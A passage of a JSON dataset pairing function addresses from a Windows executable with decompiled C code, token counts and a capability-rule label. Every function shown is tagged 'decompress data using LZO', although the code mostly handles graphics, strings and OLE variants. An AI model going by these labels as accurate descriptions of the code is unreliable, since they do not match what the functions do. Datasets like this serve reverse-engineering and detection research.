iVar6 = iVar6 + 1;\n                    uVar4 = fcn.00405a3c();\n                    *((uVar4 - 1) + iVar6) = *(in_EAX + -1 + iVar6);\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 <= iVar3);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 446
    },
    "00411658": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411658(int32_t arg_8h, uint16_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint pvarg;\n    uint *var_8h;\n    int32_t *var_4h;\n    \n    if (*arg_ch == 0x400c) {\n        fcn.00411658(arg_8h, *(arg_ch + 4), arg_10h, arg_14h);\n        return;\n    }\n    if (arg_8h == 0) {\n        var_8h = NULL;\n    }\n    else {\n        sub.oleaut32.dll_VariantInit();\n        var_8h = &pvarg;\n    }\n    uVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uVar1 = *arg_ch;\n    if (uVar1 < 0x102) {\n        if ((uVar1 == 0x101) || ((uVar1 == 9 || (uVar1 == 0xd)))) {\ncode_r0x004116d8:\n            if (*0x49997c != NULL) {\n                (**0x49997c)(var_8h, arg_ch, arg_10h, &arg_14h);\n            }\n            goto code_r0x00411723;\n        }\n    }\n    else if ((uVar1 == 0x4009) || (uVar1 == 0x400d)) goto code_r0x004116d8;\n    cVar2 = fcn.00416178();\n    if (cVar2 == '\\0') {\n        fcn.00410ef4();\n    }\n    else {\n        (**(*var_4h + 0x10))(&arg_14h, arg_10h);\n    }\ncode_r0x00411723:\n    *in_FS_OFFSET = uVar3;\n    if (var_8h != NULL) {\n        fcn.00411a68();\n        fcn.0041163c();\n    }\n    return;\n}\n",
        "token_count": 475
    },
    "00415730": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415730(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    \n    uVar1 = *param_2;\n    if (uVar1 < 0xe) {\n        if (uVar1 != 0xd) {\n            if (uVar1 == 0) {\n                fcn.0040700c();\n                return;\n            }\n            if (uVar1 == 1) {\n                if (*0x491a5c != '\\0') {\n                    fcn.00410e58();\n                }\n                fcn.0040700c();\n                return;\n            }\n            if (uVar1 != 9) goto code_r0x004157b1;\n        }\n        fcn.00407024();\n    }\n    else {\n        if (uVar1 == 0x101) {\n            fcn.004156b8(param_1);\n            return;\n        }\n        if ((uVar1 == 0x4009) || (uVar1 == 0x400d)) {\n            fcn.00407024();\n            return;\n        }\ncode_r0x004157b1:\n        cVar2 = fcn.00416178();\n        if (cVar2 != '\\0') {\n            fcn.0040700c();\n            cVar2 = fcn.00404704();\n            if (cVar2 != '\\0') {\n                return;\n            }\n        }\n        fcn.00410e58();\n    }\n    return;\n}\n",
        "token_count": 338
    },
    "004166e4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004166e4(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack28 = 0x416773;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.004164e8();\n    cVar1 = *in_EAX;\n    if (cVar1 == '\\x01') {\n        puStack36 = 0x416720;\n        fcn.00409edc();\n    }\n    else if ((cVar1 == '\\x02') || (cVar1 == '\\t')) {\n        puStack36 = &fcn.004166e4::var_4h;\n        fcn.00405a44();\n        fcn.00409edc();\n    }\n    else {\n        puStack36 = 0x41675b;\n        fcn.00416540();\n    }\n    *in_FS_OFFSET = puStack36;\n    uStack28 = 0x41677a;\n    iStack32 = 0x416772;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 307
    },
    "0041a664": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041a727)\n// WARNING: Removing unreachable block (ram,0x0041a6d1)\n// WARNING: Removing unreachable block (ram,0x0041a6dd)\n// WARNING: Removing unreachable block (ram,0x0041a749)\n// WARNING: Removing unreachable block (ram,0x0041a732)\n// WARNING: Removing unreachable block (ram,0x0041a754)\n\nvoid fcn.0041a664(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x41a78d;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    fcn.0041af60();\n    iVar2 = iVar1;\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00405620();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x41a794;\n    uStack60 = 0x41a77f;\n    fcn.00405530();\n    uStack60 = 0x41a78c;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 482
    },
    "0041ac4c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041ac76)\n\nvoid fcn.0041ac4c(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41ac9d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    (**(*in_EAX + 0x1c))();\n    fcn.0041b978();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41aca4;\n    uStack24 = 0x41ac9c;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 189
    },
    "0041ad34": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041ae1a)\n\nvoid __fastcall fcn.0041ad34(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char *pcVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    code *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x41aebd;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x41ad66;\n    fcn.0041a30c();\n    uStack68 = 0x41ae8b;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    (**(*in_EAX + 0x44))();\n    if (param_2 != NULL) {\n        fcn.0041af60();\n        iVar2 = fcn.004098ec();\n        if (iVar2 == 0) {\n            while (*param_2 != '\\0') {\n                for (; ((cVar1 = *param_2,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r')); param_2 = param_2 + 1\n                    ) {\n                }\n                fcn.00405620();\n                (**(*in_EAX + 0x38))();\n                if (*param_2 == '\\r') {\n                    param_2 = param_2 + 1;\n                }\n                if (*param_2 == '\\n') {\n                    param_2 = param_2 + 1;\n                }\n            }\n        }\n        else {\n            if (*(*0x494d28 + 0xc) == '\\0') {\n                var_10h = fcn.0040aa54;\n            }\n            else {\n                var_10h = fcn.0040e998;\n            }\n            fcn.0041af60();\n            while (*param_2 != '\\0') {\n                fcn.0041af60();\n                fcn.004059dc();\n                pcVar3 = (*var_10h)();\n                for (; (*param_2 != '\\0' && (pcVar3 != param_2)); param_2 = param_2 + 1) {\n                }\n                fcn.00405620();\n                (**(*in_EAX + 0x38))();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x41ae92;\n    uStack68 = 0x41ae8a;\n    fcn.0041a3c8();\n    return;\n}\n",
        "token_count": 697
    },
    "0041c198": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0041c198(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.004059dc();\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 47
    },
    "0041d0f4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041d11b)\n// WARNING: Removing unreachable block (ram,0x0041d123)\n\nvoid fcn.0041d0f4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x41d144;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    fcn.0041ea20();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41d14b;\n    uStack20 = 0x41d143;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 183
    },
    "0041de5c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041deb1)\n\nvoid __fastcall fcn.0041de5c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack56 = &stack0xfffffffc;\n    uStack48 = 0x41e0a4;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x41e056;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = 0x41de97;\n    fcn.0041e9e4();\n    uStack72 = 0x41e02f;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar3 = 1;\n    *(in_EAX + 0x88) = 1;\n    var_14h = param_2;\n    puStack68 = &stack0xfffffffc;\n    while( true ) {\n        for (; (iVar3 < 1 && (*(iVar3 + -1) != '.')); iVar3 = iVar3 + 1) {\n        }\n        iStack76 = in_EAX + 0x80;\n        fcn.00405a44();\n        if (0 < iVar3) break;\n        fcn.00404890();\n        puVar2 = fcn.004165a4();\n        if (puVar2 == NULL) {\n            fcn.00405584();\n            *(in_EAX + 0x88) = 0;\n            (**(*var_14h + 4))();\n            *(in_EAX + 0x88) = 1;\n            if (*(in_EAX + 0x80) != 0) {\n                fcn.0041d044();\n            }\n            *in_FS_OFFSET = iStack76;\n            *in_FS_OFFSET = iStack64;\ncode_r0x0041e08e:\n            *in_FS_OFFSET = iStack52;\n            puStack44 = 0x41e0ab;\n            uStack48 = 0x41e0a3;\n            fcn.00405530();\n            return;\n        }\n        var_18h = NULL;\n        if (***puVar2 == '\\a') {\n            var_18h = fcn.00416614();\n        }\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            fcn.0041de40(&stack0xfffffffc);\n        }\n        var_14h = var_18h;\n        iVar3 = iVar3 + 1;\n    }\n    fcn.00404890();\n    iVar3 = fcn.004165a4();\n    if (iVar3 == 0) {\n        *(in_EAX + 0x88) = 0;\n        (**(*var_14h + 4))();\n        *(in_EAX + 0x88) = 1;\n        if (*(in_EAX + 0x80) != 0) {\n            fcn.0041d044();\n        }\n    }\n    else {\n        fcn.0041e258();\n    }\n    *in_FS_OFFSET = iStack76;\n    *in_FS_OFFSET = iStack64;\n    goto code_r0x0041e08e;\n}\n",
        "token_count": 880
    },
    "0041f608": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f608(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    \n    bVar1 = *0x10 == 0x14;\n    fcn.00405974();\n    if (bVar1) {\n        if (param_2 != 0) {\n            param_2 = *(param_2 + -4);\n        }\n        if (param_2 < 0x100) {\n            fcn.0041f708();\n            fcn.0041f50c();\n        }\n        else {\n            fcn.0041f708();\n            fcn.0041f50c();\n        }\n        fcn.0041f50c();\n    }\n    else {\n        fcn.0041f708();\n        fcn.0041f50c();\n        fcn.0041f50c();\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00422008": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422008(int32_t param_1)\n\n{\n    uint arg_8h;\n    \n    if (param_1 != 0) {\n        param_1 = *(param_1 + -4);\n    }\n    param_1 = param_1 + 1;\n    arg_8h = 1;\n    fcn.004059dc();\n    fcn.00422188(arg_8h, param_1);\n    return;\n}\n",
        "token_count": 101
    },
    "00422038": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422038(int32_t param_1)\n\n{\n    uint arg_8h;\n    \n    if (param_1 != 0) {\n        param_1 = *(param_1 + -4);\n    }\n    param_1 = param_1 + 1;\n    arg_8h = 2;\n    fcn.004059dc();\n    fcn.00422188(arg_8h, param_1);\n    return;\n}\n",
        "token_count": 101
    },
    "0042548c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042548c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint in_ECX;\n    int32_t in_EDX;\n    uint Y;\n    int32_t X;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.004257f0();\n    cVar1 = fcn.00425460();\n    X = in_EDX;\n    if (cVar1 == '\\x01') {\n        iVar2 = fcn.00425570();\n        X = in_EDX + iVar2 + 1;\n    }\n    if (arg_8h != 0) {\n        arg_8h = *(arg_8h + -4);\n    }\n    uVar3 = fcn.004059dc(arg_8h, 0);\n    sub.gdi32.dll_ExtTextOutA(in_EAX[1], X, in_ECX, in_EAX[0x15], 0, uVar3);\n    fcn.00425570();\n    fcn.004253f8();\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 271
    },
    "00425528": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425528(uint *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    fcn.004257f0();\n    *param_1 = 0;\n    param_1[1] = 0;\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    uVar1 = fcn.004059dc(param_2, param_1);\n    sub.gdi32.dll_GetTextExtentPoint32A(*(in_EAX + 4), uVar1);\n    return;\n}\n",
        "token_count": 141
    },
    "00425c88": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.00425c88(void)\n\n{\n    int16_t in_AX;\n    \n    if (((in_AX != 1) && (in_AX != 4)) && (in_AX != 8)) {\n        return 0;\n    }\n    return 1 << (in_AX & 0x1f);\n}\n",
        "token_count": 71
    },
    "00429a9c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00429a9c(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    \n    uVar4 = 8;\n    cVar3 = fcn.00429a1c();\n    if (cVar3 == '\\x01') {\n        uVar4 = 0;\n    }\n    else {\n        iVar2 = *(in_EAX + 0x28);\n        uVar1 = *(iVar2 + 0x3e);\n        if (uVar1 < 0x11) {\n            if (uVar1 == 0x10) {\n                if (*(iVar2 + 0x40) == 0) {\n                    uVar4 = 4;\n                }\n                else if ((*(iVar2 + 0x40) == 3) && (*(iVar2 + 0x5c) == 0x7e0)) {\n                    uVar4 = 5;\n                }\n            }\n            else if (uVar1 == 1) {\n                uVar4 = 1;\n            }\n            else if (uVar1 == 4) {\n                uVar4 = 2;\n            }\n            else if (uVar1 == 8) {\n                uVar4 = 3;\n            }\n        }\n        else if (uVar1 == 0x18) {\n            uVar4 = 6;\n        }\n        else if ((uVar1 == 0x20) && (*(iVar2 + 0x40) == 0)) {\n            uVar4 = 7;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 365
    },
    "00429fe4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00429fe4(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint uVar6;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uchar *puStack256;\n    uint uStack252;\n    int32_t *piStack248;\n    uint uStack244;\n    uint *puStack240;\n    uint uStack236;\n    uchar *puStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack212;\n    uint uStack208;\n    uchar *puStack204;\n    uint uStack200;\n    uint uStack196;\n    uchar *puStack192;\n    uint var_aah;\n    uint var_48h;\n    uint var_44h;\n    ushort var_40h;\n    ushort var_3eh;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint hpal;\n    uint hgdiobj;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint lpbmih;\n    int32_t lpbInit;\n    uint var_10h;\n    uint hdc;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack204 = &stack0xfffffffc;\n    puStack192 = 0x42a017;\n    var_8h = in_EDX;\n    (**(*in_EDX + 0xc))();\n    bVar5 = var_20h == 0xc;\n    if (bVar5) {\n        var_20h = 0x28;\n    }\n    puStack192 = 0x42a03c;\n    piVar1 = fcn.00402f00();\n    uStack196 = 0x42a505;\n    uStack200 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff38;\n    uStack208 = 0x42a4d8;\n    uStack212 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff2c;\n    if (bVar5) {\n        puStack204 = &stack0xfffffffc;\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        fcn.00403af4();\n        piVar1[1] = var_44h;\n        piVar1[2] = var_44h._2_2_;\n        *(piVar1 + 3) = var_40h;\n        *(piVar1 + 0xe) = var_3eh;\n    }\n    else {\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        if ((piVar1[4] != 3) && (piVar1[4] != 0)) {\n            var_8h = fcn.00404620();\n            if (arg_8h == 0) {\n                fcn.00403af4();\n            }\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            uStack224 = 0x42a16a;\n            fcn.0041b9b0(in_ECX - var_20h, 0);\n            uStack224 = 0x42a17a;\n            (**(*var_8h + 0x14))();\n        }\n    }\n    *piVar1 = var_20h;\n    if (*(piVar1 + 3) != 1) {\n        fcn.004259f8();\n    }\n    if ((var_20h == 0x28) && (((*(piVar1 + 0xe) == 0x10 || (*(piVar1 + 0xe) == 0x20)) && (piVar1[4] == 3)))) {\n        fcn.0041b940();\n    }\n    if (piVar1[8] == 0) {\n        iVar2 = fcn.00425c88();\n        piVar1[8] = iVar2;\n    }\n    fcn.0041b940();\n    if ((piVar1[5] == 0) || (piVar1[4] == 0)) {\n        iVar2 = fcn.00425ca8();\n        uVar4 = piVar1[2] >> 0x1f;\n        piVar1[5] = iVar2 * ((piVar1[2] ^ uVar4) - uVar4);\n    }\n    if (bVar5) {\n        fcn.00425f54();\n    }\n    sub.user32.dll_GetDC();\n    uStack252 = fcn.00425b18();\n    uStack224 = 0x42a453;\n    uStack228 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff1c;\n    hdc = uStack252;\n    if (((piVar1[4] == 0) || (piVar1[4] == 3)) && (*0x491bb8 == '\\0')) {\n        puStack232 = NULL;\n        uStack236 = 0;\n        puStack240 = &fcn.00429fe4::lpbInit;\n        uStack244 = 0;\n        puStack256 = 0x42a3d9;\n        piStack248 = piVar1;\n        iVar2 = sub.gdi32.dll_CreateDIBSection();\n        if ((iVar2 == 0) || (lpbInit == 0)) {\n            puStack256 = 0x42a3ed;\n            iVar2 = sub.kernel32.dll_GetLastError_1();\n            if (iVar2 == 0) {\n                puStack256 = 0x42a3f6;\n                fcn.004259f8();\n            }\n            else {\n                puStack256 = 0x42a3fd;\n                fcn.0040f26c();\n            }\n        }\n        uStack260 = 0x42a422;\n        uStack264 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffef8;\n        uStack268 = 0x42a418;\n        puStack256 = &stack0xfffffffc;\n        fcn.0041b940();\n        *in_FS_OFFSET = uStack264;\n        *in_FS_OFFSET = uStack252;\n        uStack244 = 0x42a45a;\n        piStack248 = hdc;\n        uStack252 = 0;\n        puStack256 = 0x42a452;\n        sub.user32.dll_ReleaseDC();\n        return;\n    }\n    var_10h = 0;\n    puStack232 = 0x42a295;\n    lpbInit = fcn.00402f00();\n    uStack236 = 0x42a3bb;\n    puStack240 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff10;\n    uStack244 = 0x42a2b3;\n    puStack232 = &stack0xfffffffc;\n    fcn.0041b940();\n    uStack244 = hdc;\n    piStack248 = 0x42a2bc;\n    sub.gdi32.dll_CreateCompatibleDC();\n    piStack248 = 0x42a2c1;\n    var_10h = fcn.00425b18();\n    piStack248 = 0x1;\n    uStack252 = 1;\n    puStack256 = hdc;\n    uStack260 = 0x42a2d1;\n    uStack260 = sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack264 = var_10h;\n    uStack268 = 0x42a2db;\n    uVar3 = sub.gdi32.dll_SelectObject();\n    var_34h = 0;\n    if (piVar1[8] != 0) {\n        uStack268 = 0x42a2f9;\n        uStack272 = fcn.00426210();\n        uStack268 = 0;\n        uStack276 = var_10h;\n        uStack280 = 0x42a30b;\n        var_34h = sub.gdi32.dll_SelectPalette();\n        uStack280 = var_10h;\n        puStack284 = 0x42a317;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack288 = 0x42a38f;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    uVar6 = var_10h;\n    puStack284 = &stack0xfffffffc;\n    iVar2 = sub.gdi32.dll_CreateDIBitmap(var_10h, piVar1, 4, lpbInit, piVar1, 0);\n    if (iVar2 == 0) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 == 0) {\n            fcn.004259f8();\n        }\n        else {\n            fcn.0040f26c();\n        }\n    }\n    *in_FS_OFFSET = uVar6;\n    if (var_34h != 0) {\n        sub.gdi32.dll_SelectPalette(var_10h, var_34h, 0xffffffff, 0x42a396);\n    }\n    uVar3 = sub.gdi32.dll_SelectObject(var_10h, uVar3);\n    sub.gdi32.dll_DeleteObject(uVar3);\n    return;\n}\n",
        "token_count": 2181
    },
    "0042bf5c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042c02d)\n// WARNING: Removing unreachable block (ram,0x0042c043)\n\nvoid __fastcall fcn.0042bf5c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uVar4;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint lpBuffer;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint var_24h;\n    uint nSize;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack108 = 0x42bf89;\n    var_10h = param_2;\n    fcn.00405fe8();\n    uStack112 = 0x42c0fd;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    puStack108 = &stack0xfffffffc;\n    if (*0x491e9c == NULL) {\n        puStack108 = &stack0xfffffffc;\n        fcn.0040dbb8();\n        fcn.00404ec4();\n    }\n    fcn.00403af4();\n    var_24h = fcn.00405eb8();\n    var_38h = *0x42c10c;\n    uStack56 = *0x42c110;\n    uStack52 = *0x42c114;\n    uStack48 = *0x42c118;\n    var_ch = &fcn.0042bf5c::var_38h;\n    fcn.0040700c();\n    var_4h = 0;\n    iVar1 = fcn.00405ec8();\n    if (iVar1 < 1) {\n        uVar2 = 0x15;\n    }\n    else {\n        nSize = 0x10;\n        iVar1 = sub.kernel32.dll_GetComputerNameA(&fcn.0042bf5c::lpBuffer, &fcn.0042bf5c::nSize);\n        if (iVar1 == 0) {\n            bVar3 = false;\n        }\n        else {\n            fcn.004057a0();\n            fcn.004057d4();\n            fcn.004057d4(0);\n            uVar2 = fcn.004059dc();\n            fcn.004057a0(0, uVar2);\n            uVar2 = fcn.004059dc();\n            iVar1 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            bVar3 = iVar1 == 2;\n        }\n        if (bVar3) {\n            uVar2 = 0x15;\n        }\n        else {\n            uVar2 = 0x10;\n        }\n    }\n    uVar4 = var_10h;\n    (**0x491e9c)(var_10h, 0, uVar2, &fcn.0042bf5c::var_28h, 1, &fcn.0042bf5c::var_ch);\n    fcn.0042bd80();\n    fcn.0042bd80();\n    fcn.00407024();\n    *in_FS_OFFSET = uVar4;\n    fcn.00405554(0x42c104);\n    fcn.004060ac();\n    return;\n}\n",
        "token_count": 821
    },
    "0042c430": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c430(int32_t arg_8h, int16_t **arg_ch)\n\n{\n    int16_t **ppiVar1;\n    uchar *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int32_t *in_EAX;\n    int16_t *piVar5;\n    int32_t iVar6;\n    char *in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t **in_FS_OFFSET;\n    uint uVar9;\n    int32_t *piStack1656;\n    uint uStack1652;\n    uchar *puStack1648;\n    int32_t *piStack1644;\n    uint uStack1640;\n    uchar *puStack1636;\n    uint32_t var_650h;\n    uint bstrString;\n    int32_t aiStack592 [127];\n    uint *var_50h;\n    uint *var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    int16_t **var_40h;\n    int16_t **var_3ch;\n    int16_t **var_38h;\n    int16_t **var_34h;\n    int32_t var_30h;\n    int16_t *var_2ch;\n    uint *var_28h;\n    int32_t *var_24h;\n    uint var_20h;\n    \n    puStack1648 = &stack0xfffffffc;\n    puStack1636 = 0x42c452;\n    var_24h = in_EAX;\n    fcn.00405fe8();\n    uStack1640 = 0x42c75b;\n    piStack1644 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff994;\n    var_30h = 0;\n    uStack1652 = 0x42c738;\n    piStack1656 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff988;\n    var_48h = in_EDX[1];\n    puVar2 = &stack0xfffffffc;\n    puStack1636 = &stack0xfffffffc;\n    if (0x40 < var_48h) {\n        puStack1636 = &stack0xfffffffc;\n        fcn.0040dbb8();\n        fcn.00404ec4();\n        puVar2 = puStack1648;\n    }\n    puStack1648 = puVar2;\n    if (var_48h != 0) {\n        var_34h = arg_ch;\n        var_38h = &fcn.0042c430::var_650h + var_48h * 4;\n        uVar7 = 0;\n        do {\n            ppiVar1 = var_34h;\n            var_38h = var_38h + -4;\n            var_2ch = in_EDX[uVar7 + 3] & 0x7f;\n            uVar3 = in_EDX[uVar7 + 3] & 0x80;\n            if (var_2ch == 0xa) {\n                *var_38h = 0xa;\n                var_38h[2] = 0x80020004;\n            }\n            else {\n                if (var_2ch == 0x48) {\n                    var_3ch = &fcn.0042c430::bstrString + var_30h * 2;\n                    if (uVar3 == 0) {\n                        piVar5 = fcn.0040646c();\n                        *var_3ch = piVar5;\n                        var_3ch[1] = NULL;\n                        *var_38h = 0x8;\n                        var_38h[2] = *var_3ch;\n                    }\n                    else 